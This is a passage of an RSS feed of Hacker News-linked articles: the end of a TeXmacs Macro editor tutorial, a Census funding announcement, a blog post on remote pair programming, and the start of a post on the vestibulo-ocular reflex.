      surrounding markup‚Äîclicking twice selects one of the words in the
      compound name of the variable (between hyphens), clicking three times
      selects the whole variable name without the <span>value</span>
      markup surrounding it‚Äîand then we type over it the text that we
      wish to: ‚Äúdark green‚Äù (without the quotes) in place of <span color="#008000"><i>todo-color</i></span> and ‚Äúpastel green‚Äù
      (likewise) in place of <span color="#008000"><i>todo-bg-color</i></span>.
    </p>
    <p>
      In Figure <a href="#fig:environment-variable-selected">6</a> we show the effect of clicking three or four
      times on the environment variable. When clicking three times (shown on
      the left side of the image), the <span>value</span> markup
      surrounding the variable name is not enclosed in the selection, which in
      this case does not reach the focus frame, as shown in the magnified view
      on the bottom; when clicking four times (as in the right side of the
      image), the selection reaches the edge of the focus frame and encloses
      the <span>value</span> markup.
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><img src="https://texmacs.github.io/notes/docs/macro-editor-7.The%20macro%20editor%2006%20-%20marked.png" width="365.518192"></td>
        </tr><tr>
          <td></td>
        </tr><tr>
          <td><p><span><p>
              <b>Figure 6. </b><a id="auto-11"></a>The environment variable <span color="#008000"><i>todo-color</i></span> selected clicking three times
              (upper left) and four times (upper right). When clicking three
              times, the <span>value</span> markup surrounding the
              variable name is not enclosed in the selection, which does not
              reach the focus frame (magnified view at the bottom); when
              clicking four times, the selection extends to the whole focus
              frame and encloses the <span>value</span> markup.<a id="fig:environment-variable-selected"></a>
            </p></span>
          </p></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      Clicking the <a id="auto-12"></a> or the <a id="auto-13"></a> button will save the edited macro
      in the document preamble.
    </p>
    <p>
      TeXmacs will save to the preamble the contents of the Macro editor
      window, so if one leaves the macro name as it is, the macro saved in the
      preamble is executed by TeXmacs in place of the original macro (while
      the original definition is not overwritten, the macro editor modifies
      only the current file). Changing in stead the name of the macro leaves
      the original definition in force‚Äîand one has a new macro with the
      new definition.
    </p>
    <p>
      Let us then in our example change the macro name to <span>todo-green</span>,
      by clicking inside the <span>todo</span> field on top and typing,
      we will have then a new macro available‚Äîrepeating ourselves, if we
      hadn't, the <span>todo</span> macro would have pointed to the new
      definition we are saving in our preamble, and in this case all of the
      <span>todo</span> fields would have become green, including the
      ones we had already written. You can see the edited macro in Figure <a href="#fig:todo-macro-edited-green">7</a>.
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><img src="https://texmacs.github.io/notes/docs/macro-editor-8.The%20macro%20editor%2007.png" width="562.33568"></td>
        </tr><tr>
          <td></td>
        </tr><tr>
          <td><p><span><p>
              <b>Figure 7. </b><a id="auto-14"></a>The ‚Äúgreen‚Äù version of
              the <span>todo</span> macro, which we named <span>todo-green</span><a id="fig:todo-macro-edited-green"></a>
            </p></span>
          </p></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      Press <a id="auto-15"></a> to close the Macro
      editor confirming the changes, and we can see the new macro <span>todo-green</span>
      in our preamble: select ‚Üí<a id="auto-16"></a> (in the
      ‚ÄúNotes‚Äù style: in other styles it is ‚Üí‚Üí<a id="auto-17"></a>). We look at it in Figure <a href="#fig:preamble">8</a>.
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><img src="https://texmacs.github.io/notes/docs/macro-editor-9.The%20macro%20editor%2008%20-%20marked.png" height="345.8364432" width="566.5531976"></td>
        </tr><tr>
          <td></td>
        </tr><tr>
          <td><p><span><p>
              <b>Figure 8. </b><a id="auto-18"></a>The preamble of our document after
              saving the <span>todo-green</span> macro we composed
              starting from the <span>todo</span> macro. The arrow and
              the oval highlight the TeXmacs notification that we are looking
              at the preamble.<a id="fig:preamble"></a>
            </p></span>
          </p></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      We can now use the new macro: <span color="#008000">[I would like to have blue
      notes too!]</span> and <span></span>.<span></span>.<span></span>.<span></span> <span color="#000080">[here is a blue todo
      note :-)]</span> (to do this, I started again from a <span>todo</span>
      note and applied again the Macro editor).
    </p>
    <p>
      For colors which do not have a name in TeXmacs, one can use HTML codes;
      if TeXmacs does not recognize a color name, it uses black.
    </p>
    <h2 id="auto-19">2.<span></span>More choice<span></span></h2>
    <p>
      In math mode the macro <span>choice</span> inserts a left brace
      that introduces a vertical list, represented with the help of a table.
    </p>
    <p>
      Here it is, inserted by typing <tt>\choice</tt> <span>‚Ü©</span> inside a display math environment; we placed two
      elements inside it:
    </p>
    <table>
      <tbody><tr>
        <td><img src="https://texmacs.github.io/notes/docs/macro-editor-10.png" id="eq:choice-macro"></td>
        <td>(1)</td>
      </tr>
    </tbody></table>
    <p>
      Using the Macro editor, let's build a new macro that places the brace on
      the right.
    </p>
    <p>
      The first step is again placing the cursor in the macro input field (in
      the vector next to the brace in this case) and pressing the wrench key
      in the toolbar. The Macro editor window in this case shows the typeset
      macro in math mode (Figure <a href="#fig:choice_macro_math_mode">9</a>).
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><img src="https://texmacs.github.io/notes/docs/macro-editor-11.The%20macro%20editor%208.png" width="566.5531976"></td>
        </tr><tr>
          <td></td>
        </tr><tr>
          <td><p><span><p>
              <b>Figure 9. </b><a id="auto-20"></a>Editing the <span>choice</span>
              macro in the Macro editor.<a id="fig:choice_macro_math_mode"></a>
            </p></span>
          </p></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      The source mode representation of the macro is complex (Figure <a href="#fig:choice_macro_source_mode">10</a>),
      but maybe we do not need to know what is the <span>math-table-base</span>
      macro, nor what are <span color="#008000"><i>cell-swell</i></span> and <span color="#008000"><i>table-math-swell</i></span>; let's try.
    </p>
    <p>
      Let us notice the two paired delimiters <span color="blue">&lt;</span>left<span color="blue">|</span><span color="black">{</span><span color="blue">&gt;</span> and <span color="blue">&lt;</span>right<span color="blue">|</span><span color="black">.</span><span color="blue">&gt;</span>: we have to swap them. Of course, the left brace must
      become a right brace.
    </p>
    <p>
      As a second step, let us guess that the macro <span>math-table-base</span>
      and the variables <span color="#008000"><i>cell-swell</i></span> and <span color="#008000"><i>table-math-swell</i></span> determine the placement of the
      ‚Äúvector of choice‚Äù with respect to the brace. We do not know
      whether <span>math-table-base</span> distinguishes right from
      left in such a way that the placement of the vector with respect to a
      closing brace would be awkward with the default settings of <span color="#008000"><i>cell-swell</i></span>
      and <span color="#008000"><i>table-math-swell</i></span>,
      but‚Äîagain‚Äîlet us try and see what happens!
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><img src="https://texmacs.github.io/notes/docs/macro-editor-12.The%20macro%20editor%209.png" width="566.5531976"></td>
        </tr><tr>
          <td></td>
        </tr><tr>
          <td><p><span><p>
              <b>Figure 10. </b><a id="auto-21"></a>The source mode representation of
              the <span>choice</span> macro.<a id="fig:choice_macro_source_mode"></a>
            </p></span></p></td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://texmacs.github.io/notes/docs/macro-editor.html">https://texmacs.github.io/notes/docs/macro-editor.html</a></em></p>]]>
            </description>
            <link>https://texmacs.github.io/notes/docs/macro-editor.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26182251</guid>
            <pubDate>Thu, 18 Feb 2021 16:55:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Census Raises $16M Series A from Sequoia]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26181985">thread link</a>) | @nate
<br/>
February 18, 2021 | https://blog.getcensus.com/announcing-our-series-a-from-sequoia/ | <a href="https://web.archive.org/web/*/https://blog.getcensus.com/announcing-our-series-a-from-sequoia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <section>
                <div>
                    <p>I‚Äôm thrilled to announce that Census has raised a $16 million Series A, led by Sequoia Capital. Andreessen Horowitz (who led our seed) is also participating, along with operators like Dylan Field (Figma CEO), Jason Warner (GitHub CTO), Akshay Kothari (Notion COO), Parker Conrad (Rippling CEO), Josh Ferguson (Mode Chief Architect), Bryant Chou (Webflow CTO), Joe Thomas (Loom CEO), Patrick McKenzie (Stripe) and Guillaume Cabane. This round brings our total amount raised to just over $20 million.</p><p>We're also launching the <a href="https://blog.getcensus.com/introducing-the-census-startup-program">Census Startup Program</a> to empower startups to easily build the last mile of the modern data stack. Companies with fewer than 40 employees and less than $10MM in funding will be able to use Census for a flat rate of $100 per month.</p><figure><img src="https://lh3.googleusercontent.com/PqQs9ECN6mKTopIPG2ZhvZL_-FmCS_h7uB_VAAizC02R6hS7wXGBj2G2ph7tafLbpJ_66C5dfvp6ljRvWCqejYEW-GHIiVWw5KEqwi42b2sijRGJsCFh-ZhMkWJffuIxVNbl0m2j" alt=""></figure><p>In 2018, we started with a simple product that helped business teams sync data from their cloud warehouses into their favorite tools. Since then, the data landscape has changed a lot ‚Äì now we're starting to see analytics &amp; data move to the core of all company operations. We <a href="https://blog.getcensus.com/meet-census/">launched publicly</a> last year with the world's first reverse ETL that natively publishes from any data warehouse (we dubbed this the "missing piece" in the modern data stack). The reaction has been nothing short of phenomenal ‚Äì Census is now syncing analytics for over half a billion users every day.</p><p>We're lucky to support some pretty amazing teams using Census, like Canva, Figma, Drizly, Heap Analytics, Netlify, Mode Analytics, Notion, and Chorus.ai just to name a few. These organizations are unified by a shared focus on delivering personalized experiences for every customer, even when they've scaled to hundreds of millions of users.</p><p>To do this, they treat data as a central pillar of their organization, instead of just paying lip service to being "data-driven." Putting data teams on the critical path of every business operation has emerged as the category of <a href="https://blog.getcensus.com/what-is-operational-analytics/">Operational Analytics</a> ‚Äì and has been the driving force for our company.</p><h3 id="operational-analytics-aka-the-data-warehouse-as-hub">Operational Analytics, aka. the Data Warehouse as Hub</h3><p>Three years ago, we asked, ‚ÄúWhy are we relying on a clumsy tangle of wires connecting every app when everything we need is already in the warehouse? What if you could leverage your data team to drive operations?‚Äù</p><p>When the data warehouse is connected to the rest of the business, the possibilities are limitless. When we launched, our focus was enabling product-led companies like Figma, Canva, and Notion to drive better marketing, sales, and customer success. Along the way, our customers have pulled Census into more and more scenarios, like auto-prioritizing support tickets in <a href="https://blog.getcensus.com/census-zendesk-for-better-customer-support/">Zendesk</a>, automating invoices in <a href="https://headwayapp.co/census-changelog/netsuite-destination-186207">Netsuite</a>, or even integrating with HR systems. With our growing library of <a href="https://www.getcensus.com/integrations">native integrations</a>, Census makes it possible for data models in your cloud data warehouse to power any business workflow.</p><figure><img src="https://blog.getcensus.com/content/images/2021/02/Eventail-Diagram-4.png" alt="" srcset="https://blog.getcensus.com/content/images/size/w600/2021/02/Eventail-Diagram-4.png 600w, https://blog.getcensus.com/content/images/size/w1000/2021/02/Eventail-Diagram-4.png 1000w, https://blog.getcensus.com/content/images/size/w1600/2021/02/Eventail-Diagram-4.png 1600w, https://blog.getcensus.com/content/images/size/w2400/2021/02/Eventail-Diagram-4.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>The performance improvements we've seen in the modern data stack (fast incremental ingestion from our partners at <a href="https://fivetran.com/blog/fivetran-partners-with-census-to-complete-the-loop-on-operational-analytics">Fivetran</a>, separated workloads on Redshift, improving latency from Snowflake, the arrival of <a href="https://blog.getcensus.com/census-databricks/">Delta Lake</a>, etc.) finally make it possible for the data warehouse to act as a <a href="https://blog.getcensus.com/the-best-cdp-solution-is-already-sitting-in-your-data-warehouse/">new kind of CDP</a> (Customer Data Platform). One that enables hyper-scale businesses to deliver the attention and personalization that customers historically only get from, say, a small neighborhood boutique. This is the promise of Operational Analytics.</p><h3 id="the-rise-of-the-data-ops-ecosystem">The Rise of the Data Ops Ecosystem</h3><p>Census is part of a larger movement in the data ecosystem, one in which the precepts of Engineering and DevOps are washing over the world of analytics. Marc Andreessen famously said "software is eating the world." Our team has always believed in the corollary: "software practices will eat the business." We've made it our mission from day one to help data teams build solutions like engineers. And we‚Äôve worked with amazing partners in bringing this vision to reality.</p><figure><img src="https://lh6.googleusercontent.com/eLy_nydDOnPyVwsQEHTu8k3cGiicY2EAKJn6E8pC4gankSOLcc66qnhf1O0KiY4cD2Y6-LABH4KGMtQ9pw9D61APtXf5UPcGLp-f3bs-bFCnTsM42AInrUL6_PXvTUH6GW10t7aW" alt=""><figcaption>Fivetran + dbt + Census = Feedback Loop</figcaption></figure><p>Census takes models and insights from a data warehouse then <a href="https://whatsnew.getcensus.com/built-in-data-validation-186053">validates</a> and <a href="https://blog.getcensus.com/making-your-dbt-models-more-useful-with-census/">deploys</a> the results so they can be put to work in other teams (ie. the real world). With our native understanding of dbt model versions, you can safely orchestrate your entire data operations from input to output. Census closes the feedback loop to make the whole much greater than the sum of the parts.</p><p>But what most drives this movement‚Äîand what we love most about it‚Äîis the amazing community of developers, analysts, and operations experts that all help each other to build better systems. Our partners at Fishtown have fostered one of the most inclusive and helpful communities, which supported and embraced Census early on ‚Äì led by the intrepid <a href="https://twitter.com/clairebcarroll">Claire Caroll</a> (fun fact: she helped popularize our ‚Äúreverse ETL‚Äù concept in 2019). We participate in our small way with tool talks and office hours. There‚Äôs a real excitement around the modern data stack, which is why we created our new startup program so folks could adopt this stack regardless of company size or budget.</p><h3 id="the-future-data-as-a-product">The Future: Data as a Product</h3><p>The next decade is going to be an exciting one for data teams, and our early customers are pointing the way. Instead of constantly building (and fixing) one-off reports, data teams are poised to become a central nervous system for the business.</p><p>Traditionally, BI teams have been focused on asynchronous, batch processing instead of real-time, personalized processing. Analysts build reports to answer questions about what happened in the business, which is like looking at the rear view mirror. This data architecture could crunch raw data into KPIs and charts but wasn‚Äôt optimized for understanding individual users or entities. Even worse, it was disconnected from day-to-day operations, which forced data teams to do painful periodic reconciliations with the business.</p><figure><img src="https://blog.getcensus.com/content/images/2021/02/new-data-teams-4.png" alt="" srcset="https://blog.getcensus.com/content/images/size/w600/2021/02/new-data-teams-4.png 600w, https://blog.getcensus.com/content/images/size/w1000/2021/02/new-data-teams-4.png 1000w, https://blog.getcensus.com/content/images/size/w1600/2021/02/new-data-teams-4.png 1600w, https://blog.getcensus.com/content/images/size/w2400/2021/02/new-data-teams-4.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Operational Analytics changes the role of data teams</figcaption></figure><p>Modern data teams are built differently. Instead of a data sink, they are a platform for applications, analysis, visualization ‚Äì and most importantly, action. Instead of focusing on data aggregation for BI visualization, a new modeling layer must emerge that captures clean, unified yet individualized entities that can be used in any application. In order to support all these scenarios, a few things are crucial.</p><ol><li>The data infrastructure must be scalable, efficient, and real-time.</li><li>The data modeling layer must be versioned, tested, deployed, and ultimately standardized for broad consumption.</li><li>The data pipelines must reach any application, and be seamlessly monitored to create tight feedback loops with every part of the organization</li></ol><h3 id="the-road-map-ahead">The Road(map) Ahead</h3><p>There‚Äôs a ton of capabilities in Census and even more to come. Here‚Äôs some of the areas we‚Äôve been working on and plan to expand upon this year.</p><ul><li><strong>Code-Based Orchestration.</strong> Today, we sync models seamlessly from a warehouse but we want to push the bar forward here and make every Census workflow versionable and pluggable into larger orchestration systems.</li><li><strong>Deeper Data Validation.</strong> When your data models are connected to business systems, failures become much worse (which is a good thing, after all if your mistakes have no impact, what‚Äôs the point?). Census is your last line of defense before the data is live so validating your data is key.</li><li><strong>Visual Query Experience.</strong> When data becomes a product, it means you have more consumers. Many of these consumers need a way to interact with models with a simple UX, which furthers our goal of data reaching every part of the organization.</li></ul><p>If this sounds like a lot, it's because it is. We're embarking on a long journey to transform data organizations into product teams. Teams that can scale to support many users and many use cases. By shifting into this central role, data teams stop being backwards-looking and become the biggest drivers of change in an organization ‚Äì the ultimate feedback loop.</p><h3 id="join-us">Join us</h3><p>The companies &amp; leaders who understand this will certainly succeed and I look forward to seeing an amazing cohort of Chief Data Officers in the decade to come. There is a huge amount of work ahead of us and I am unbelievably excited to tackle these problems every day. Empowering people with tools has been my passion ever since I started my career in technology. If you want to help make an impact and move the needle on the entire data ecosystem, <a href="https://jobs.ashbyhq.com/Census">come join our team</a>. We‚Äôre small but mighty and hiring for every position. You can reach me on <a href="https://twitter.com/borisjabes">Twitter</a> or via <a href="mailto:boris@getcensus.com">email</a>.</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.getcensus.com/announcing-our-series-a-from-sequoia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26181985</guid>
            <pubDate>Thu, 18 Feb 2021 16:38:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rethinking Pair Programming]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26181867">thread link</a>) | @afkmango
<br/>
February 18, 2021 | https://amypeniston.com/rethinking-pair-programming/ | <a href="https://web.archive.org/web/*/https://amypeniston.com/rethinking-pair-programming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
  <div id="content">
    <div>
      

<figure><img width="1024" height="536" src="https://amypeniston.com/downloads/Social-Border-1024x536.jpg" data-src="https://amypeniston.com/downloads/Social-Border-1024x536.jpg" alt="" data-srcset="https://amypeniston.com/downloads/Social-Border-1024x536.jpg 1024w, https://amypeniston.com/downloads/Social-Border-300x157.jpg 300w, https://amypeniston.com/downloads/Social-Border-768x402.jpg 768w, https://amypeniston.com/downloads/Social-Border.jpg 1200w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://amypeniston.com/downloads/Social-Border-1024x536.jpg 1024w, https://amypeniston.com/downloads/Social-Border-300x157.jpg 300w, https://amypeniston.com/downloads/Social-Border-768x402.jpg 768w, https://amypeniston.com/downloads/Social-Border.jpg 1200w"></figure>



<p>Not a fan of pair programming? You‚Äôre not the only one.</p>



<p>For years, I hated pair programming. I thought it was an inconvenience without benefit, something you do to appease your manager or check a box.</p>



<p>I was wrong.</p>



<p>Over the last year, my co-founder and I have pair programmed for roughly 6 days a week. With practice, we‚Äôve honed our setup and, in doing so, figured out an effective way to collaborate on code.</p>



<p>In this post, I will share our pair programming formula and outline the benefits that we enjoy. I will also discuss the challenges and downsides of pair programming to prepare you for any pushback that you might receive.</p>



<p>If you‚Äôre new to pair programming, I hope this post inspires you to apply it in your daily life.</p>



<p>If you‚Äôre not a fan of pair programming, I hope this post challenges you to reframe your past experiences and rethink collaborative coding.</p>



<p>Either way, I provide an actionable plan to help you implement and optimize a collaborative setup.</p>



<p>Let me be clear: pair programming doesn‚Äôt work for every project or for every team. But, it works for us and it might work for you. This post is for developers who are open to trying something new.</p>



<p>What follows is a deep dive into pair programming. Feel free to skip ahead to the sections that interest you the most:</p>



<ul><li><a href="#pair-programming">What is pair programming?</a></li><li><a href="#optimal-setup">Optimizing your pair programming setup</a></li><li><a href="#benefits">Benefits</a></li><li><a href="#challenges">Challenges &amp; downsides</a></li><li><a href="#other-tasks">Pairing on other tasks</a></li><li><a href="#programming-threesomes">Programming threesomes</a></li><li><a href="#conclusion">Conclusion</a></li></ul>



<p>Let‚Äôs get into it.</p>



<figure><img width="1024" height="190" src="https://amypeniston.com/downloads/Post-8-1-1024x190.jpg" data-src="https://amypeniston.com/downloads/Post-8-1-1024x190.jpg" alt="" data-srcset="https://amypeniston.com/downloads/Post-8-1-1024x190.jpg 1024w, https://amypeniston.com/downloads/Post-8-1-300x56.jpg 300w, https://amypeniston.com/downloads/Post-8-1-768x142.jpg 768w, https://amypeniston.com/downloads/Post-8-1-1536x285.jpg 1536w, https://amypeniston.com/downloads/Post-8-1-2048x380.jpg 2048w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://amypeniston.com/downloads/Post-8-1-1024x190.jpg 1024w, https://amypeniston.com/downloads/Post-8-1-300x56.jpg 300w, https://amypeniston.com/downloads/Post-8-1-768x142.jpg 768w, https://amypeniston.com/downloads/Post-8-1-1536x285.jpg 1536w, https://amypeniston.com/downloads/Post-8-1-2048x380.jpg 2048w"></figure>



<h2 id="pair-programming">What is pair programming?</h2>



<p>Pair programming is a collaborative style of working on software development projects. It involves two individuals who are both engaged on the same code at the same time.</p>



<p>This is not the official Agile definition, which stipulates that developers share a single workstation.</p>



<p>To be clear: working side-by-side is not my ideal setup and I will not attempt to convince you to use it. Virtual pairing is far superior to brushing elbows ‚Äì but, more on that later.</p>



<p>In a typical pair programming session, there are two different roles:</p>



<ul><li>The <strong>Driver</strong> ‚Äì writes code</li><li>The <strong>Navigator</strong> ‚Äì offers direction and reviews code</li></ul>



<p>Every so often, the Driver and the Navigator switch roles. How frequently this occurs depends on the team and the project ‚Äì it can range from every few minutes to every few hours. The swap can also be triggered by an event, such as the Driver finishing a unit test or getting stuck.</p>



<p>The Driver and the Navigator maintain a running commentary throughout the duration of the session. This is often called ‚Äúprogramming out loud‚Äù and it is a challenge in itself. Speaking while coding is like narrating your morning routine: you‚Äôre forced to vocalize something internal and often subconscious. Add in the fact that there‚Äôs another human listening to your rambling and it‚Äôs not surprising that developers struggle to program out loud.</p>



<p>Regardless, for non-developers, pair programming seems harmless. You‚Äôve got two developers coding together in real time. What‚Äôs the big deal?</p>



<p>In reality, pair programming is a polarizing practice. Software developers are are either enthusiastic evangelists or outspoken opponents. Few claim to be ambivalent.</p>



<p>Until recently, I was a pair programming skeptic. My opinion had soured over the course of several years due to bad experiences falling into one of four categories:</p>



<ol><li><strong>Personal space violations:</strong> pairing with someone who has a greasy desk or unpleasant BO.</li><li><strong>Misaligned objectives: </strong>pairing with someone who refuses to engage, or, even worse, is more interested in showing off than collaborating.</li><li><strong>Management disasters:</strong> pairing with multiple people in a ‚Äúgroup coding project‚Äù (a special type of hell that is inevitably doomed to failure).</li><li><strong>Character clashes:</strong> pairing with a bullish extrovert for a series of memorably uncomfortable and counterproductive sessions.</li></ol>



<p>For me, the net result of these negative experiences was a strong aversion to pair programming.</p>



<p>And that was pretty much the end of it. I avoided pair programming at all costs and off I went on my merry way.</p>



<p>Until I started pair programming with my co-founder.</p>



<p>Fast forward a year and now admit that I was wrong. It took finding the right partner and experimenting with different setups to finally unlock the benefits of pair programming.</p>



<p>In the next section, I outline the key components of an optimal pair programming setup. This includes finding a suitable partner, scheduling sensible time blocks and utilizing collaborative technologies.</p>



<p>Finally, I‚Äôll discuss the practical logistics to help you structure your environment for remote pair programming success.</p>



<figure><img width="1024" height="190" src="https://amypeniston.com/downloads/Post-9-1024x190.jpg" data-src="https://amypeniston.com/downloads/Post-9-1024x190.jpg" alt="" data-srcset="https://amypeniston.com/downloads/Post-9-1024x190.jpg 1024w, https://amypeniston.com/downloads/Post-9-300x56.jpg 300w, https://amypeniston.com/downloads/Post-9-768x142.jpg 768w, https://amypeniston.com/downloads/Post-9-1536x285.jpg 1536w, https://amypeniston.com/downloads/Post-9-2048x380.jpg 2048w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://amypeniston.com/downloads/Post-9-1024x190.jpg 1024w, https://amypeniston.com/downloads/Post-9-300x56.jpg 300w, https://amypeniston.com/downloads/Post-9-768x142.jpg 768w, https://amypeniston.com/downloads/Post-9-1536x285.jpg 1536w, https://amypeniston.com/downloads/Post-9-2048x380.jpg 2048w"></figure>



<h2 id="optimal-setup">Optimizing your pair programming setup</h2>



<p>My co-founder and I have pair programmed roughly 6 days per week since March 2020, with each session lasting between 1 and 5 hours.</p>



<p>Here are the essential elements that make up our hyper-productive pair programming sessions:</p>



<figure><img width="1024" height="53" src="https://amypeniston.com/downloads/Frame-27-3-1024x53.png" data-src="https://amypeniston.com/downloads/Frame-27-3-1024x53.png" alt="" data-srcset="https://amypeniston.com/downloads/Frame-27-3-1024x53.png 1024w, https://amypeniston.com/downloads/Frame-27-3-300x16.png 300w, https://amypeniston.com/downloads/Frame-27-3-768x40.png 768w, https://amypeniston.com/downloads/Frame-27-3-1536x80.png 1536w, https://amypeniston.com/downloads/Frame-27-3-2048x107.png 2048w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://amypeniston.com/downloads/Frame-27-3-1024x53.png 1024w, https://amypeniston.com/downloads/Frame-27-3-300x16.png 300w, https://amypeniston.com/downloads/Frame-27-3-768x40.png 768w, https://amypeniston.com/downloads/Frame-27-3-1536x80.png 1536w, https://amypeniston.com/downloads/Frame-27-3-2048x107.png 2048w"></figure>



<h3>A Suitable Partner</h3>



<p>Finding the right person to pair with is the foundation of any successful pair programming session. This is obvious.</p>



<p>What is not so obvious is what exactly constitutes the ‚Äúright person‚Äù.</p>



<p><strong>Personality</strong></p>



<p>Personality plays a big part of any successful relationship. If you‚Äôre going to be pair programming with someone every day, it‚Äôs important to make sure that you both get along. </p>



<p>Current or former colleagues can be perfect partners because your professional relationship sets the tone for your future engagements. The challenge with colleagues is to assess whether your personalities are a match; make sure to do a trial run or two.</p>



<p>Friends can also make good partners, but you must be careful to avoid distraction. Your personal relationship may inhibit decision making and detract from the seriousness and focus of your sessions.</p>



<p>Rather than be overly prescriptive, I will outline the important qualities to look for in a pair programming partner:</p>



<ul><li><strong>Humility and humor.</strong> Find someone who can admit to being wrong and laugh at their mistakes. Don‚Äôt let ego third wheel your pair programming sessions.</li></ul>



<ul><li><strong>Willingness to communicate.</strong> When working remotely, communication is key. My co-founder and I both make a concerted effort to be better listeners and let each other finish our thoughts. Interruption is even more jarring when you‚Äôre not sitting in the same room.</li></ul>



<ul><li><strong>Commitment. </strong>A mismatch in commitment will result in differing levels of interest and output. This will inevitably lead to resentment between contributors.</li></ul>



<p><strong>Experience &amp; Skills</strong></p>



<p>Should you pick a partner with the same expertise? In my experience, no ‚Äì diversity trumps overlap.</p>



<p>For example, my co-founder is a software developer and data scientist. He has significantly more technical experience than I do and is much faster at translating ideas into code.</p>



<p>It sounds like we might be a poor match, but the opposite is true:</p>



<ul><li>Because I ask novice questions, my co-founder is challenged to understand and explain concepts more thoroughly.</li><li>Because I am often unfamiliar with the language we‚Äôre using, I spot things that only a fresh pair of eyes would.</li><li>Because I am slower to write code, we talk through solutions before implementing them, thus avoiding needless time sinks.</li></ul>



<p>The big caveat is that my co-founder actually wants to work with me. We acknowledge and celebrate the differences in our skill sets, rather than resenting one another for not being on the same level.</p>



<p>The combination of my design expertise and his programming skills enable us to own the development pipeline. We can start with an idea and translate it from mockups through to a final deliverable. We can tackle a wide variety of tasks without relying on other parties, thus speeding up the process and maintaining control. </p>



<p>I cannot overstate: diversity in skills gives you super powers.</p>



<p>Finally, I understand that not every developer has the luxury of choosing their pair programming partner. In this case, you must lead by example and champion the important qualities outlined above. Your efforts will determine your success.</p>



<h4>Recommendations</h4>



<p><em>Find a partner with a different skill set. Don‚Äôt worry if there‚Äôs an experience gap, it‚Äôs often better that way. Discuss what each of you bring to the table and acknowledge your strengths and weaknesses</em>.<em> Practice being better listeners.</em></p>



<figure><img width="1024" height="53" src="https://amypeniston.com/downloads/Frame-27-2-1024x53.png" data-src="https://amypeniston.com/downloads/Frame-27-2-1024x53.png" alt="" data-srcset="https://amypeniston.com/downloads/Frame-27-2-1024x53.png 1024w, https://amypeniston.com/downloads/Frame-27-2-300x16.png 300w, https://amypeniston.com/downloads/Frame-27-2-768x40.png 768w, https://amypeniston.com/downloads/Frame-27-2-1536x80.png 1536w, https://amypeniston.com/downloads/Frame-27-2-2048x107.png 2048w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://amypeniston.com/downloads/Frame-27-2-1024x53.png 1024w, https://amypeniston.com/downloads/Frame-27-2-300x16.png 300w, https://amypeniston.com/downloads/Frame-27-2-768x40.png 768w, https://amypeniston.com/downloads/Frame-27-2-1536x80.png 1536w, https://amypeniston.com/downloads/Frame-27-2-2048x107.png 2048w"></figure>



<h3>Schedule</h3>



<p>Once you‚Äôve found the right person, when and for how long should you schedule your pair programming sessions?</p>



<p>The time of day that you choose will be personal preference and job specific. We originally started coding in the mornings to get in a few hours before our 9-5 jobs. We‚Äôve since stuck with this schedule and have found that a 7am start time works best for us.</p>



<p>At the beginning of every session, we confirm our stop time. Sessions are capped at five hours, which includes no more than four hours of active coding. To quote Cal Newport‚Äôs ‚ÄúDeep Work‚Äù, this time is dedicated to ‚Äúdistraction-free concentration that pushes [our] cognitive capabilities to their limit‚Äù.</p>



<p>But why not schedule longer sessions?</p>



<p>As we discovered early on, pair programming is physically and mentally exhausting. Working with a singular focus requires intense attention and intention. And, unlike solitary deep work, pair programming comes with an accountability partner who helps you stay fixated on the task at hand. You don‚Äôt have the luxury of context switching to something easier when what you‚Äôre working on gets tough.</p>



<p>We also block off all pair programming time in our calendars to prevent interruption.</p>



<p>During long sessions we usually take one or two five- to 10-minute breaks. We don‚Äôt schedule these rest periods, but instead take them whenever one of us needs to.</p>



<p>Breaks are a chance to stretch our legs, make a fresh coffee and come back to our desks feeling refreshed. As many software developers can attest, bugs are often squashed immediately upon returning from a break.</p>



<p>Finally, our sessions happen daily, unless otherwise ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://amypeniston.com/rethinking-pair-programming/">https://amypeniston.com/rethinking-pair-programming/</a></em></p>]]>
            </description>
            <link>https://amypeniston.com/rethinking-pair-programming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26181867</guid>
            <pubDate>Thu, 18 Feb 2021 16:30:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Image Stabilization ‚Äì In Humans]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26181737">thread link</a>) | @bucket2015
<br/>
February 18, 2021 | https://i-kh.net/2021/02/18/image-stabilization-in-humans/ | <a href="https://web.archive.org/web/*/https://i-kh.net/2021/02/18/image-stabilization-in-humans/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      
        <p>As I read more neuroscience, I run into more interesting neural circuits. One of these circuits is the Vestibulo-Ocular Reflex (VOR) that helps us keep the eyes locked on a target when the head moves. </p>
